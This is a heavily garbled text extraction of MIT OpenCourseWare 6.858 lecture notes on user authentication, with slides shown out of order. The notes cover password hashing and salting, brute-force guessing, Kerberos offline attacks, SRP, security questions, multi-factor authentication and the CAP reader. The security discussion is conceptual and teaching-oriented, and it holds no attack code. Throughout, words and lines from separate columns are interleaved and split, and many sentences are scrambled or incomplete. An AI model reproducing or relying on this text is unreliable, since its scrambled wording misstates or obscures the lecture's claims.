Theft.	&#13; 
	&#13; 
 	&#13; it	&#13; can	&#13; be	&#13; stolen	&#13; (except	&#13; for	&#13; biometrics).	&#13; 
 Ser
Serverver--CCompatible	&#13; +	&#13; Resilientompatible	&#13; +	&#13; Resilient--toto--InterLeaksnal
-from-Obs
-Othervati
er-o
Verifiers.n.	&#13; 
Server	&#13; compatible	&#13; means	&#13; sending	&#13; a	&#13; password.	&#13; Passwords	&#13; can	&#13; be	&#13; st	&#13; 
ol
	&#13; machine,	&#13; replayed	&#13; by	&#13; one	&#13; server	&#13; to	&#13; another. 	&#13; en	&#13; on	&#13; user	&#13; 
	&#13; 
Multi
 Requires	&#13; users	&#13; to	&#13; authenticate	&#13; themselves	&#13; using-factor	&#13; authentication	&#13; (MFA):	&#13; defense	&#13; using	&#13; dep
	&#13; two	&#13; or	&#13; more	&#13; authentication	&#13; th.	&#13; 
 mechanisms.The	&#13; mecha
o nisms	&#13; should	&#13; involve	&#13; different	&#13; modalities!	&#13; 
o Something	&#13; you	&#13; know	&#13; (e.g.,	&#13; a	&#13; password)
Something	&#13; you	&#13; possess	&#13; (e.g.,	&#13; a	&#13; cellphone,	&#13; 	&#13; 
 Something	&#13; you	&#13; are	&#13; (e.g.,	&#13; biometrics)	&#13; a	&#13; hardware	&#13; token) 	&#13; 
toIdea	&#13; is	&#13; that	&#13; an	&#13; attacker	&#13; must	&#13; steal/subvert
us	&#13; o 
	&#13; multiple	&#13; authentication	&#13; mechanisms	&#13; 
impersonate	&#13; a	&#13; user	&#13; (e.g.,	&#13; attacker	&#13; might	&#13; guess	&#13; a	&#13; password,	&#13; but	&#13; lack	&#13; access	&#13; to	&#13; a	&#13; 	&#13; 
 er's	&#13; phone). 	&#13; 
 Example:	&#13; Google's	&#13; two
cellphone	&#13; which 	&#13; can	&#13; receive	&#13; aut-factor	&#13; au
horizatthentica
ion	&#13; codes	&#13; via	&#13; ttion	&#13; requires	&#13; 
exa	&#13; p
t	&#13; assword	&#13; plus	&#13; a	&#13; 
 message.
Example:	&#13; AWS	&#13; two	&#13; 
device"	&#13; (a	&#13; smartphone-factor	&#13; authentication	&#13; requires 	&#13; a	&#13; password	&#13; and	&#13; an	&#13; "MFA	&#13; 
secu
MFA	&#13; is	&#13; a	&#13; good	&#13; idea,	&#13; but	&#13; empirical	&#13; studies
authorit
e y	&#13; token	&#13; or	&#13; securit	&#13; ru
yn
	&#13; card).ning	&#13; a
	&#13; n	&#13; authentication	&#13; app,	&#13; or	&#13; a 	&#13; special-purpose	&#13; 
 http://aws.amazon.com/iam/details/mfa/
ntication	&#13; factor	&#13; in	&#13; addition	&#13; to 	&#13; passwords,	&#13; users	&#13; pick	&#13; much	&#13; weaker	&#13; 	&#13; show	&#13; tha	&#13; 
t	&#13; if	&#13; users	&#13; are	&#13; given	&#13; a	&#13; second 	&#13; 
	&#13; passwords! 	&#13; 
What	&#13; are	&#13; potential	&#13; answers	&#13; to	&#13; the	&#13; homework
 Logging	&#13; into	&#13; public	&#13; Athena	&#13; machine?
o 	&#13; 	&#13; questions?	&#13; What	&#13; factors	&#13; matter?	&#13; 
o 
o Resilient
Resilient--toto--InterPhysicalnal-
-Obs
Obse
er
rvati
vatio
on:
n?	&#13; e
	&#13; asy	&#13; to 	&#13; install	&#13; malware	&#13; on	&#13; machine.	&#13; 
o 
 MITBiometrics?	&#13; Untrusted	&#13; terminals,	&#13; probably	&#13; IDs	&#13; could	&#13; be	&#13; a	&#13; good	&#13; thing	&#13; to	&#13; leverage 	&#13; (use	&#13; them	&#13; as	&#13; a	&#13; smartcard).
	&#13; not	&#13; a	&#13; great	&#13; plan. 	&#13; 	&#13; 
Accessing	&#13; Facebook	&#13; from	&#13; Internet	&#13; cafe?
o 
o Password	&#13; managers	&#13; not	&#13; a	&#13; good	&#13; idea	&#13; her	&#13; 
How	&#13; sensitive	&#13; is	&#13; the	&#13; data? 	&#13; e.	&#13; 
8
This course makes use of Athena, MIT's UNIX-based computing environment. OCW does not provide access
to this environment.</text>
        </slide>
        <slide>
          <slideno>9</slideno>
          <text>Res-to-Trgtd-Imp:       Yes \__ One-time codes! 
Res-to-Thrtld-Guess:    Yes / 
Res-to-UnThrtld-Guess:  Yes/ 
Res-to-Internal-Obv:    Yes     Dedicated device Res-to-Phishing:        Yes     One-time codes 
No-trusted-3rd-Party:   Yes     Each site is its own 
verifier
	&#13; 	&#13; 	&#13; 	&#13; 	&#13; 	&#13; 	&#13; 	&#13; 	&#13; 	&#13; 	&#13; 	&#13; 	&#13; 	&#13; 	&#13; 	&#13; 	&#13; 	&#13; 	&#13; 	&#13; 	&#13; 	&#13; 	&#13; 	&#13; 	&#13; 	&#13; 	&#13; 	&#13; 	&#13; 	&#13;  
Res-Other 	&#13; codes 	&#13; 
reaSo,	&#13; 
ders	&#13; passw-
oVer
rd8
s	&#13; 
=-
8Leaks:    Yes     
haven't 	&#13; take	&#13; and
n	&#13; o	&#13; CAP
ve	&#13; 
rr
	&#13; thea
ed
	&#13; woer=
r1
ld0.
	&#13; (5
s.	&#13; 
eH
eoOne
wev-time
 scores).	&#13; 	&#13; the	&#13; loer
w	&#13; us,	&#13; the
abire	&#13; a
lir
tye	&#13; 
	&#13; r
andeas
	&#13; don
eplos	&#13; w
yabihy	&#13; C
liAP
ty	&#13; 	&#13; 
In	&#13; pr
oactice,	&#13; d
 Migratieployability	&#13; and
on	&#13; costs	&#13; (coding+	&#13; us
dability	&#13; ar
ebugging	&#13; ee	&#13; oft
ffen
ort,	&#13; mo
	&#13; usr
ee
r	&#13; 
	&#13; i
tmp
raino
ir
nta
gn
)	&#13; t
ma	&#13; tha
kn
e	&#13; 	&#13; 
dse
ec
vu
er
loit
py 	&#13; 
nere.
o vous!rs	&#13; 
 pick	&#13; easThe	&#13; less	&#13; u	&#13; 
sable	&#13; a	&#13; scheme	&#13; is,	&#13; the	&#13; more	&#13; th
Some
o 	&#13; situationsier
	&#13; ma	&#13; authentication	&#13; tokens
y	&#13; assign	&#13; different	&#13; we	&#13; that
ights	&#13; 
	&#13; a
tra
et
	&#13; 	&#13; 
mouse
rr
es
	&#13; 	&#13; 
vw
ui
ll
nl	&#13; 
ec
ro
amp
blel
	&#13; a
ti
on
	&#13; a	&#13; (
tand	&#13; try	&#13; to	&#13; 
Ex:o	&#13; different	&#13; evaluation	&#13; meta
trc
ik
cers).
s.	&#13; 	&#13; 
	&#13; mig	&#13; O
htn
	&#13; o	&#13; a
u	&#13; mi
twl
eit
igar
hy
	&#13; t	&#13; 
hb
ea
	&#13; s
pe
r,	&#13; 
oth
be
le	&#13; s
msec
	&#13; u
wr
ii
tt
hy	&#13; 
	&#13; be
usane
bif
li
its
ty	&#13; o
	&#13; andf	&#13; a	&#13; h
	&#13; dar
eplodwar
yabie-bas
lity.e
	&#13; d	&#13; token	&#13; 
10</text>
        </slide>
        <slide>
          <slideno>3</slideno>
          <text>o Anyone	&#13; could	&#13; ask	&#13; 
o pas
resps
onwor
se	&#13; d
w,	&#13; i.e.,
oul	&#13; th
d	&#13; be
e	&#13; 	&#13; KDthe	&#13; KDC	&#13; 
	&#13; nofor
t	&#13; auth	&#13; a	&#13; tick
enC
cryp	&#13; did
ted	&#13; wiee
ntit	&#13; encrypt
cate	&#13; reed	&#13; w
quesit
tsh	&#13; t
	&#13; (ahe	&#13; user's	&#13; 
lthough	&#13; the	&#13; 
Atparta
allelizcker	&#13; c
e.	&#13; Since	&#13; the	&#13; ticketan	&#13; try	&#13; brute-force	&#13; 
-grto	&#13; 
antingguth
ess	&#13; K_
	&#13; thc)
e.	&#13; 
	&#13; user's	&#13; password---this	&#13; is	&#13; easy	&#13; to 	&#13; 
o attacke
In	&#13; Kerbr
e	&#13; can
ros	&#13; 	&#13; 
vd
5e
,t
	&#13; te
ir
cmi
ketn
	&#13; re
e	&#13; w
quh
ee
sn
t	&#13; 
oa
r	&#13; decry-ti
pcket	&#13; has	&#13; a	&#13; known	&#13; format,	&#13; the	&#13; 
with	&#13; request,	&#13; to	&#13; prove	&#13; knowledg	&#13; mu
e	&#13; ofs
	&#13; K_t	&#13; it
nio
cln
u	&#13; 
dis
e	&#13; s
	&#13; {u
	&#13; tc
ic
meess
sf
tu
	&#13; cal
mp.	&#13; 
.	&#13; 	&#13; }_{K_c}	&#13; along	&#13; 
P
 ass
Peoplword
e	&#13; oft	&#13; reco
en	&#13; focus	&#13; on	&#13; tvery	&#13; is	&#13; extre
he	&#13; entmely	&#13; 
ropy	&#13; of	&#13; passwimportant,	&#13; but	&#13; often	&#13; overl
usedords, 	&#13; but	&#13; if	&#13; rook
ecoved.
er	&#13; 
y	&#13; questions	&#13; can	&#13; be
 min(	&#13; to	&#13; r
passes
wet
or	&#13; 
dpas
_enswor
tropd
ys
,	&#13; ,	&#13; the	&#13; s
recovtr
ery_questength	&#13; of
ion_ent	&#13; a	&#13; passwor
ropy).d	&#13; authentication
	&#13; 	&#13; scheme	&#13; is	&#13; 	&#13; 
 Recover
somebody	&#13; questions	&#13; ar
y	&#13; got	&#13; access	&#13; te	&#13; often	&#13; easily	&#13; guessable.
o	&#13; Sarah	&#13; Palin's	&#13; Yahoo	&#13; addr	&#13; In	&#13; 
ess	&#13; by	&#13; guessing	&#13; answerone	&#13; famous	&#13; example,	&#13; 
 to	&#13; h
oe
 r	&#13; security	&#13; questions. 	&#13; s	&#13; 
name
	&#13; 	&#13; 	&#13; 	&#13; 	&#13; 	&#13; 	&#13; 	&#13; 	&#13; 	&#13; 	&#13; o or?"	&#13; "W
o	&#13; oIntr
f	&#13; yoinsically	&#13; low	&#13; entropy	&#13; ("What's 	&#13; your	&#13; favorite	&#13; col hat's	&#13;  the	&#13; 
 An
Selfs
-wur
e	&#13; b
rse
	&#13; st	&#13; 
generle
ated	&#13; questions	&#13; araf
kri
ee
dn
	&#13; d
vi?
a"
	&#13; )
s	&#13; 
ocial	&#13; me
e	&#13; typicallydia	&#13; profiles
	&#13; ea	&#13; ("What'ssy	&#13; to	&#13; answ	&#13; your
er	&#13; ("W	&#13; favor
hatite
	&#13; is	&#13; 5	&#13; +	&#13; 5?	&#13; movie
")?"
	&#13; )	&#13; 
In	&#13; the	&#13; revaluatead
e	&#13; auing	&#13; f
thenor
tic	&#13; tod
atioay,	&#13; the	&#13; author
as	&#13; bad	&#13; as	&#13; they	&#13; seem).	&#13; Tn
h	&#13; s
ec
	&#13; authheme
os
r	&#13; 
s(ths	&#13; pr
e	&#13; gopos
oal	&#13; ise
	&#13; t	&#13; a	&#13; bunch
o	&#13; dete	&#13; of	&#13; factors	&#13; that	&#13; can	&#13; be	&#13; used	&#13; to	&#13; 
deployability,	&#13; and	&#13; security. 	&#13; 	&#13; consider	&#13; three	&#13; highrmi
-len
ve
e	&#13; wh
l	&#13; meeth
tre
icr
s	&#13; pas
:	&#13; uss
ability,	&#13; words	&#13; are	&#13; 
	&#13; 
 Usabilit
oy:	&#13; How
 Easy	&#13; easy	&#13; is	&#13; it
-to-Learn	&#13; for	&#13; users	&#13; t
:	&#13; "Users	&#13; wo
ho	&#13; 	&#13; int
donera
'tct
	&#13; k	&#13; w
nowith
	&#13; 	&#13; 
tt
hh
ee
	&#13; 	&#13; 
sa
cu
ht
eh
meentication
and
	&#13; le
 arn	&#13; it	&#13; without	&#13; too	&#13; much	&#13; trouble."	&#13; 	&#13; can	&#13; figu	&#13; s
rc
eh
	&#13; ie
tme
	&#13; ou?
t	&#13; 
	&#13; 
o Infrequent	&#13; erThis	&#13; is	&#13; a
ror	&#13; k
sey	&#13; rea
:	&#13; "The	&#13; tasson	&#13; w
k	&#13; that	&#13; ushy	&#13; passw
ersord
	&#13; mu	&#13; s
sc me
ht	&#13; he s	&#13; are	&#13; s
succeeds
 	&#13; wperform	&#13; to	&#13; lo
o	&#13; p
g	&#13; o
in	&#13; usuapular!	&#13; 
lly	&#13; 
o T
pashis
s	&#13; 
worise
	&#13; n
a	&#13; 
np
	&#13; e
imprfor
ome
rtad
n	&#13; 
tb
	&#13; ry
e	&#13; a
a	&#13; 
sl
oe
ngi
	&#13; t
wima d	&#13; 
dhy	&#13; t
use	&#13; a
ern
s	&#13; pick	&#13; eashonest	&#13; user."
y-to-guess	&#13; 	&#13; 
Scalables.	&#13; 
not	&#13; 
increa
 -for
se	&#13; t-U
he	&#13; bsers
urden	&#13; on	&#13; t:	&#13; "Using	&#13; th
he	&#13; user."e	&#13; scheme
	&#13; 	&#13; for	&#13; hundreds	&#13; of	&#13; accounts	&#13; does	&#13; 
o 
simpexpl
lea
	&#13; ins	&#13; w
per-sihy
te	&#13; 
	&#13; people	&#13; of
uniquifyinten
g	&#13; s	&#13; reu
chese	&#13; 
mep
	&#13; fa
ossw
r	&#13; a	&#13; basords	&#13; 
e	&#13; pasor	&#13; crea
swot
re	&#13; 
da
.	&#13; 	&#13; 

o Easy	&#13; recovery	&#13; from	&#13; l
Not
hing	&#13;  
 A	&#13; 
tw
o	&#13; i
can	&#13; for	&#13; passo
wss
o	&#13; 
ro
df	&#13; 
st
--he
th	&#13; auth
ey'ree
	&#13; enti
ascati
y	&#13; too
	&#13; rn	&#13; to
eseke
t.	&#13; n	&#13; 
	&#13; 
 Anotherry
r	&#13; w	&#13; 
in	&#13; for	&#13; passwords.	&#13; 
Dep
systeloya
ms?b
	&#13; ility:	&#13; How	&#13; easy	&#13; is	&#13; it	&#13; to	&#13; incorporate 	&#13; the	&#13; authentication	&#13; method	&#13; into	&#13; real	&#13; 
4</text>
        </slide>
        <slide>
          <slideno>0</slideno>
          <text>6.858	&#13; Lecture	&#13; 17 	&#13; 

C
 
 or
Ie
s	&#13; c
	&#13; th
ha
el
rle
en
	&#13; ag
ne:	&#13; How	&#13; can	&#13; humaUSE
	&#13;  onR
y soluti n	&#13; that	&#13; tota	&#13; u
lls	&#13; AUTH
ers	&#13; proE
vNTI
e	&#13; thCATI
eir	&#13; idON
ent	&#13; 
ity	&#13; to	&#13; a	&#13; program?	&#13; 
At	&#13; fi
or
 
o st	&#13; 
Lowglan
	&#13; c
ene,	&#13; passwy	&#13; dominates	&#13; passwords?	&#13; 
o Back-up	&#13; strop
ecury	&#13; --o
&gt;	&#13; rd
eas	&#13; 
sy	&#13; see
for	&#13; m	&#13; w
atr
te
at d
ity	&#13; quesckch
ers	&#13; e .	&#13; 
tions	&#13; for	&#13; passt
woro	&#13; gu
dess	&#13; 
s	&#13; arth
e	&#13; loem.	&#13; 
 As	&#13; the	&#13; pA	&#13; 
au
ps
ee
rr
	&#13; f	&#13; 
oo
rft
	&#13; te
on
d	&#13; e
amp
y's	&#13; l
co
ly
ass
s	&#13; a
	&#13; s	&#13; s
ti
an
tg
el
se
,	&#13; 	&#13; 
"p
Ta
hs
esw
	&#13; coo
nrd
ti	&#13; 
nfor	&#13; multw	&#13; e
iplentr
	&#13; sito
epy	&#13; to
s.	&#13; o.	&#13; 
over	&#13; all	&#13; other	&#13; methods	&#13; of	&#13; end-user	&#13; authentication	&#13; iued
s	&#13; 
	&#13; d
a	&#13; o
mami
jn
oa
rt
	&#13; eio
mbn	&#13; o
af
r	&#13; p
raa
ss
ss
mewo
nrd
t	&#13; s
secuto	&#13; 
 rity	&#13; researchers."	&#13; 
But	&#13; 
 passwor	&#13; is	&#13; t
dhere	&#13; a
s?	&#13; ctually	&#13; an	&#13; authentication 	&#13; scheme	&#13; which	&#13; totally	&#13; dominates	&#13; 
Plan	&#13; for	&#13; t
2)1) 
 
 TaSee	&#13; hooday's	&#13; l
w	&#13; curreecture:
lk	&#13; about	&#13; desirant	&#13; pas	&#13; 
ble	&#13; propertsword	&#13; schemes	&#13; work.	&#13; 
	&#13; 3)See	&#13; how	&#13; other	&#13; authenticationies	&#13; for	&#13; a
	&#13; schemen
s	&#13; auth
	&#13; compenti
arecati
	&#13; to	&#13; o
pn	&#13; s
assch
we
ome
rds.	&#13; 
.	&#13; 
A	&#13; 
 pa
Ns
as
iw
veo
	&#13; r
impd	&#13; is
l	&#13; 
ea
me	&#13; sec
nr
te
at
t	&#13; 
it
oh
na
:t
	&#13; 	&#13; 
si
es	&#13; 
rs
vh
ea
rr
	&#13; hed
as	&#13; b
	&#13; ae
	&#13; t
tw
abe
le
en
	&#13; t	&#13; 
hth
ae
t	&#13; 	&#13; use
 passmapr
s	&#13; and
	&#13; use	&#13; a	&#13; s
words. 	&#13; rnae
merve
sr
	&#13; t.	&#13; 
o	&#13; plaintext	&#13; 
 P
pairrob
sl
.e
	&#13; m:	&#13; If	&#13; attacker	&#13; compromises	&#13; the	&#13; s erver,	&#13; can	&#13; recover	&#13; all	&#13; user/password	&#13; 
o 
 Improv
ue
sd
e	&#13; s
ro
_nlu
at
meion
	&#13; --:	&#13; S
&gt;	&#13; e
harve
sh(ur	&#13; sto
ser_pres	&#13; t
ah
sswis	&#13; ta
User	&#13; clord)ble:	&#13; 
ient	&#13; suppl	&#13; 
 
 Adand
v	&#13; 
adoes	&#13; 
ntaga
e	&#13; table	&#13; lies	&#13; cl
ookueart
p.	&#13; ext	&#13; password	&#13; to 	&#13; server,	&#13; the	&#13; server	&#13; hashes	&#13; the	&#13; cleartext	&#13; 
 p
Pe
rorf
bo
lr
em	&#13; 
m:a
	&#13; At	&#13; b:	&#13; 
ruHa
ts
e	&#13; h
force	&#13; 	&#13; funct
aio
ttn
as
ck	&#13; are	&#13; difficult	&#13; to 	&#13; invert,	&#13; so	&#13; it's	&#13; difficult	&#13; for	&#13; attacker	&#13; to 	&#13; 
all	&#13; possible	&#13; pastack
se
worr	&#13; do
de
ss
---n'
tht	&#13; h.	&#13; How
ea
	&#13; sv
ee
t	&#13; o	&#13; toever
	&#13; la	&#13; 
quit
oe
 	&#13; small!	&#13; f	&#13; stru
in
ngsch	&#13; 
	&#13; than	&#13; i
atne
	&#13; arff
ei
	&#13; actually	&#13; uscient	&#13; brute	&#13; f
eo
dr
	&#13; asce
	&#13; pas	&#13; sear
swoch	&#13; o
rds	&#13; ver
is	&#13; 	&#13; 
o Skewed	&#13; distr
o Yah
entropy.oo	&#13; passwoibution:	&#13; top	&#13; 5000	&#13; passwor
rd	&#13; study:	&#13; Rule -of-thumb	&#13; pasd	&#13; val
	&#13; sworues	&#13; cover	&#13; 20%	&#13; of	&#13; users.
ds	&#13; contain	&#13; 10 -20	&#13; bits	&#13; 	&#13; 
of	&#13; 
Has
h
 	&#13; fu
En
xc
:t
	&#13; A	&#13; ion
las
p	&#13; a
tore
p	&#13; 
	&#13; o
cp
anti
	&#13; mi
ops/sec.calz
ce
ud
a	&#13; p
tee
	&#13; Even	&#13; if	&#13; password	&#13; r
Sf
Ho
A1rma
s	&#13; n
overce;	&#13; th
	&#13; smais	&#13; he
	&#13; has	&#13; 20	&#13; bits	&#13; of 	&#13; entll	&#13; blps
ropy,	&#13; caloc	&#13; attac
ks	&#13; atker
2s
M!
n	&#13; cra	&#13; ~	&#13; 
ck	&#13; S
	&#13; one	&#13; HA1	&#13; 
 
PBKServ
oDF2	&#13; ore
 r	&#13; can	&#13; 
	&#13; u
BCseacco
	&#13; a
ypt)	&#13; count/s
mpec.	&#13; 
o These	&#13; functr
ions	&#13; ha.	&#13; utationally	&#13; expensive	&#13; key-derivation	&#13; function	&#13; (e.g.,	&#13; 
o Ex:	&#13; can	&#13; make	&#13; hasve	&#13; adjustable	&#13; costs,	&#13; so	&#13; 
Internally,	&#13; often	&#13; ph
e	&#13; c
ro
fos
rt
ms	&#13; be	&#13; 
	&#13; 1
re	&#13; s
pe
ec
ao
tn
ed
d	&#13; 
	&#13; --
ha	&#13; O(
shing	&#13; using	&#13; a1t
M)hey	&#13; 
	&#13; tica
men	&#13; 
sb
	&#13; se	&#13; 
	&#13; slloar
wbi
ertr
	&#13; tar
hai
nly	&#13; s
SHlo
A1w.
.	&#13; 
ow	&#13; hash. 	&#13; 	&#13;  	&#13; 
1</text>
        </slide>
        <slide>
          <slideno>10</slideno>
          <text>MIT OpenCourseWare
http://ocw.mit.edu
6.858 Computer Systems Security
Fall 2014
For information about citing these materials or our Terms of Use, visit: http://ocw.mit.edu/terms.</text>
        </slide>
        <slide>
          <slideno>2</slideno>
          <text>-----------------&gt; 
                         -Server checks whether the 
                          response is H(C || password).
	&#13; 
 Ignor 
 If
doesn't	&#13; ser
overing	&#13; MITM,	&#13; the	&#13; server	&#13; is	&#13; now	&#13; confident 	&#13; that	&#13; the	&#13; user
 	&#13; k	&#13; is
now	&#13; an	&#13; attacker
	&#13; password.	&#13; and
	&#13; 	&#13; didn't 	&#13; already	&#13; know	&#13; password	&#13; i
,	&#13; ths	&#13; Alice.	&#13; 
e	&#13; attacker 	&#13; still	&#13; 
o Q:
on	&#13; H()	&#13; va	&#13; How	&#13; can	&#13; we
lue?	&#13; 	&#13; prevent	&#13; server	&#13; from 	&#13; brute-force	&#13; guessing	&#13; password 	&#13; based	&#13; 
o A1:	&#13; Expensive	&#13; hash	&#13; +	&#13; salting.	&#13; 
 A2:	&#13; Allow	&#13; client	&#13; to	&#13; choose	&#13; some	&#13; tables.	&#13; randomness	&#13; too:	&#13; guard	&#13; against	&#13; rainbow	&#13; 
To	&#13; a
ovoid	&#13; st
 
 http://en.wikipedia.org/wiki/Secure_Remote_Password_protocol	&#13; oring	&#13; the	&#13; real	&#13; password	&#13; on	&#13; the 	&#13; server,	&#13; use	&#13; a	&#13; protocol	&#13; like	&#13; SRP: 	&#13; 
o 
 High-level	&#13; idea:	&#13; Given	&#13; a	&#13; security	&#13; parameter	&#13; g,	&#13; the	&#13; client	&#13; computes	&#13; this	&#13; 
v	&#13; =	&#13; g^(hash(salt,	&#13; passwor
establish	&#13; an	&#13; ephemeral	&#13; key	&#13; with	&#13; and	&#13; sends	&#13; v	&#13; and	&#13; the	&#13; salt	&#13; to	&#13; the 	&#13; server.	&#13; d))	&#13; 
their	&#13; shThe	&#13; 
aredcl
	&#13; knoient	&#13; and	&#13; the	&#13; server	&#13; 
takes	&#13; advantage	&#13; of	&#13; the	&#13; fact 	&#13; that	&#13; it's	&#13; difficult	&#13; for	&#13; thewle
	&#13; attacdge
ke	&#13; o
rf
logarithms	&#13; modulo	&#13; N;	&#13; RSA	&#13; also	&#13; takes	&#13; advantage	&#13; of	&#13; this	&#13; 	&#13; to	&#13; g	&#13; and	&#13; vca
	&#13; (protn	&#13; the
ocoln	&#13; 
	&#13; perform	&#13; discret	&#13; 
 e	&#13; 
 ob
Implementing	&#13; challenge/response	&#13; often	&#13; means	&#13; changing	&#13; the	&#13; client	&#13; and	&#13; the	&#13; servation). 	&#13; 
	&#13; server.	&#13; 
To	&#13; prevent Ex:	&#13; Rate	&#13; b
-limit	&#13; the	&#13; number	&#13; rute	&#13; force	&#13; attacks,	&#13; we	&#13; can	&#13; implement	&#13; 
of	&#13; password	&#13; guesses;anti
	&#13; implement	&#13; time--hammering	&#13; defenses.	&#13; 
 after	&#13; too	&#13; many	&#13; incorrect	&#13; guesses. 	&#13; out	&#13; periods	&#13; 
It's	&#13; really	&#13; important	&#13; to	&#13; throttle	&#13; guess	&#13; rate
entropy!
o 	&#13; 	&#13; because	&#13; passwords	&#13; have	&#13; so	&#13; little	&#13; 
o Many	&#13; sites	&#13; impose	&#13; requirements	&#13; on	&#13; special	&#13; chars	&#13; lik e	&#13; punctuation). 	&#13; passwords	&#13; (e.g.,	&#13; length,	&#13; the	&#13; use	&#13; of 	&#13; 
o In	&#13; reality,	&#13; what	&#13; matters	&#13; is	&#13; entropy!
int
A	&#13; competent	&#13; dictionary	&#13; attacker	&#13; can	&#13; model	&#13; password	&#13; constraints	&#13; and	&#13; still	&#13; o	&#13; higher	&#13; entropy. 	&#13; 	&#13; Format	&#13; requirements	&#13; rarely	&#13; translate	&#13; 
o gener
passwoate	&#13; r
rdsainbow	&#13; tables;	&#13; even	&#13; with
	&#13; that	&#13; adhere	&#13; to	&#13; a	&#13; priori 	&#13; charact	&#13; constraint
er	&#13; dists,	&#13; peopl
ributions.	&#13; e	&#13; wil
	&#13; l	&#13; still	&#13; pick 	&#13; 
Telepathwords:	&#13; 
 https://telepathwords.research.microsoft.com/ 	&#13; 
 As	&#13; you	&#13; type	&#13; in	&#13; a	&#13; potential	&#13; password
letter 	&#13; using	&#13; heuristics!	&#13; 	&#13; letter,	&#13; tries	&#13; to	&#13; guess	&#13; the	&#13; next	&#13; 
 C
Popular	&#13; phrases	&#13; from	&#13; web	&#13; sitesommon	&#13; passwords	&#13; (e.g.,	&#13; via	&#13; leaks	&#13; 
	&#13; of	&#13; passwo rd	&#13; databases) 	&#13; 
 Common	&#13; user	&#13; biases	&#13; in	&#13; selecting	&#13; characters	&#13; (e.g.,	&#13; using	&#13; adjacent 	&#13; 
Kerberos	&#13; v
4 
o ,	&#13; andkey
	&#13; vs	&#13; f
5or	&#13; adjacent	&#13; pas
http://www.gnu.org/so	&#13; without	&#13; pr
fteauthswo
	&#13; werd
re	&#13; charact
	&#13; vulnerabers)
le	&#13; t	&#13; 
ware/shishi/wu99realo	&#13; offl
worline	&#13; guessing
d.pdf 	&#13; 	&#13; 
3</text>
        </slide>
        <slide>
          <slideno>8</slideno>
          <text>Mi
withgh
	&#13; t	&#13; be
Faceb	&#13; le
ookverage
"	&#13; or	&#13; d
b	&#13; to
y	&#13; 	&#13; auth
answe
erinnticate 	&#13; to	&#13; other	&#13; sites!	&#13; [Either
 reset	&#13; a	&#13; password.] 	&#13; g	&#13; personal 	&#13; security	&#13; questions	&#13; 	&#13; "Logi
to	&#13; n	&#13; 
Wit
ohd
 r
Sa
ew
ci
u
n
 rg
i	&#13; 
tc
yash	&#13; fro
 Resilien	&#13; matterm	&#13; AT
ots	&#13; higM
hl?
y	&#13; 
to-Physical.	&#13; 
 - -Observation. 	&#13; 
o PossiblResilient
y trusted-
	&#13; to
ter-Theft.	&#13; 
Y[However	&#13; 
,	&#13; in	&#13; practicmi
e,	&#13; n
ba
al:	&#13; bi
ou
	&#13; a
 lso	&#13; might	&#13; care	&#13; aboun
t	&#13; k
a	&#13; 
umaome
y	&#13; t
nr
oic
t	&#13; s
w	&#13; mi
ang
th
	&#13; tt
o	&#13; b
	&#13; te
r	&#13; 
uw
so
t	&#13; r
thth
e	&#13; 
	&#13; c
to
ern
misid
ne
ar
li
sn
.]g
	&#13; .	&#13; 
 attackePrevent
r	&#13; the	&#13; adversaryt
	&#13; h
fre
on
m	&#13; tic
ua
st
ii
nn
gg
	&#13; 	&#13; 
stindividua
olen	&#13; credentl	&#13; transa
ials	&#13; ct
for	&#13; ions!
different	&#13; 
,	&#13; 
E
shex:	&#13; 
	&#13; M
wa
ay-chosen	&#13; operations.	&#13; 
using	&#13; her	&#13; phone.nb
tse
	&#13; 	&#13; 
tu
os
	&#13; e
wr
i	&#13; 
tc
ha
dn
r	&#13; e
ax
wa
	&#13; mi
mon
ne
e	&#13; b
ya
,	&#13; l
sa
hn
ec
	&#13; ue	&#13; 
sus
esing	&#13; jus
	&#13; two-fat	&#13; a	&#13; pas
	&#13; 	&#13; ctor	&#13; as
uwor
thentd,	&#13; but	&#13; if
ication	&#13; 	&#13; 
Con
passcl
worusion
ds!	&#13; 
	&#13; Fof	&#13; 
orpa
	&#13; ep
xer:	&#13; 
ampTher
ee	&#13; is	&#13; no	&#13; a
on	&#13; securit
 y!	&#13; l ,	&#13; accordinut
g	&#13; thent
o	&#13; theica
	&#13; aution
tho	&#13; s
rsc
,h
	&#13; te
hme
e	&#13; C	&#13; 
APwh
	&#13; i
reach	&#13; 
der	&#13; clea
harly
s	&#13; 	&#13; d
po
erfectminat
	&#13; scores	&#13; es	&#13; 
 T
trh
anse	&#13; C
acAP
ti	&#13; 
ore
nsad
.	&#13; er	&#13; was	&#13; designed	&#13; by	&#13; Mastercard	&#13; to	&#13; protect	&#13; online	&#13; banking	&#13; 
Usage:
1) Put	&#13; 
 calcul	&#13; your	&#13; credit
ator).	&#13; 	&#13; card	&#13; into	&#13; the	&#13; CAP	&#13; reader	&#13; (which	&#13; looks	&#13; like	&#13; a	&#13; hand -held	&#13; 
2)3) Enter
e	&#13; PIN
whRea
id
ch	&#13; thr	&#13; tal	&#13; (bypas
ks	&#13; to tsing	&#13; keyloggers!).	&#13; 
                        	&#13; e	&#13; user	&#13; s	&#13; 
upplihe	&#13; ca
erd
s	&#13; to's	&#13; e
	&#13; thmb
e	&#13; e
wedd
b	&#13; sed
i	&#13; 
tepr
.oces
CAP reader	&#13; sor,	&#13; outputs	&#13; an	&#13; 8-digit	&#13; code	&#13; 
 
    Easy-to-learn:      Yes 
    Infrequent errors:  Quasi-yes     Scalable for users: No (users require card+PIN per 
verifier) 
    Easy recovery:      No 
    Nothing to carry:   No 
                             1.5  
                        CAP reader 
   Server-compatible:   No    Browser-compatible:  Yes 
   Accessible:          No (blind people can't read 8 -digit 
code) 
                              1 
     
                        CAP reader 
Res-to-Phys-Obs:        Yes\ 
9</text>
        </slide>
        <slide>
          <slideno>5</slideno>
          <text>attempting	&#13; up	&#13; to	&#13; 2^40	&#13; or	&#13; even	&#13; 2^64	&#13; guesses	&#13; per	&#13; account	&#13; could 	&#13; still	&#13; 
only	&#13; rea
ech	&#13; few
	&#13;  cheer	&#13; than	&#13; 1%	&#13; of	&#13; accounts.	&#13; Lac
topenaliz
	&#13; wi
 thstands
	&#13; brme
utes	&#13; wh
	&#13; foe
rcr
ee
	&#13; 	&#13; th
seae
r	&#13; s
cpac
h	&#13; fre
o	&#13; o
m	&#13; f	&#13; c
ar
	&#13; se
madek
nti	&#13; of
als	&#13; thi
	&#13; is	&#13; benefit	&#13; is	&#13; meant	&#13; to	&#13; 
Passwords	&#13; fail	&#13; because	&#13; they 	&#13; have	&#13; lowll	&#13; 
	&#13; entand
ropy	&#13; +	&#13; sk	&#13; ws	&#13; 
